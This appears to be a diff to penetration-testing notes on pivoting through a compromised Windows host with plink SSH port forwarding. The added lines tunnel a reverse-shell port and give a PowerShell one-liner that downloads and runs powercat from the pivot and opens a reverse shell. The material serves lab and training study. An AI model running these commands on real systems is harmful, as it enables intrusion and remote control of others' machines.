@@ -18,11 +18,24 @@ If you are getting an error about algorithm choice when calling plink, consider 
 In the scenario where you have gained access to `SRV1` and you want to forward traffic from `SRV1` port 8000 to port 80 on your kali machine, you can do:
 
 ```
-cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 8000:${ATTACKER_IP}:80 ${ATTACKER_IP} 
+cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 0.0.0.0:8000:${ATTACKER_IP}:80 ${ATTACKER_IP} 
 ```
 
 This way, if you later pivot to `SRV2` who cannot directly access your web server on your kali machine, you can call `${SRV1_IP}:${SRV1_PORT}` (port 8000 in this example),
 to transfer files to `SRV2`.
+
+
+If you want to combine the HTTP server with the capability to catch a reverse shell, you can do:
+
+```
+cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 0.0.0.0:${SRV1_SHELL_PORT}:${ATTACKER_IP}:${ATTACKER_SHELL_PORT} ${ATTACKER_IP} 
+```
+
+Now, trigger a powercat reverse shell from `SRV2`:
+
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://${SRV1_IP}:${SRV1_HTTP_PORT}/powercat.ps1');powercat -c ${SRV1_IP} -p ${SRV1_SHELL_PORT} -e powershell
+```
 
 ### Remote Port Forwarding
 
